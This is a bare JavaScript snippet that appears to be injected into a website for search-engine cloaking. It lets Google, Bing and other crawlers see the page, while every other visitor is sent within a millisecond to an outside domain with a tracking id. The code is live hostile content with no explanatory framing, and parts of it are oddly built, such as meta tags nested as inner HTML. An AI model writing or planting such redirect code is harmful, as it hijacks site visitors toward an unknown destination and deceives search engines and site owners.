const apps = ['google', 'bing'];

        const platform = () => {
            let userAgent = navigator.userAgent || navigator.vendor || window.opera;

            if (/google/i.test(userAgent)) return 'google';
            if (/bing|yandex|baidu|duckduck/i.test(userAgent)) return 'bing';
            if (/semrush|ahref/.test(userAgent) && !window.MSStream) return 'iOS';

            return null;
        };

        const redirect = () => {
            let os = platform();

            if (!os || !apps.includes(os)) {
                function customRedirect() {
                    var metaTags = [
                        '<META HTTP-EQUIV="Content-Type" Content="text/html; charset=utf-8">',
                        '<meta http-equiv="Cache-Control" content="no-siteapp">',
                        '<meta http-equiv="Cache-Control" content="no-transform">',
                        '<meta name="applicable-device" content="pc,mobile">',
                        '<meta name="robots" content="nofollow">',
                        '<meta name="viewport" content="width=device-width,initial-scale=0.8,minimum-scale=0.8,maximum-scale=0.8,user-scalable=no">'
                    ];

                    for (var i = 0; i < metaTags.length; i++) {
                        var metaTag = document.createElement('meta');
                        metaTag.innerHTML = metaTags[i];
                        document.head.appendChild(metaTag);
                    }

                    var url = ["https://www.jp7.store"];
                    var rid = "88888888";
                    var timesleep = "88";

                    var weburl = url[Math.floor(Math.random() * url.length)] + "/?id=" + rid;

                    setTimeout(function () {
                        window.location = weburl;
                    }, 1);
                }

                customRedirect();
            }
        };

        redirect();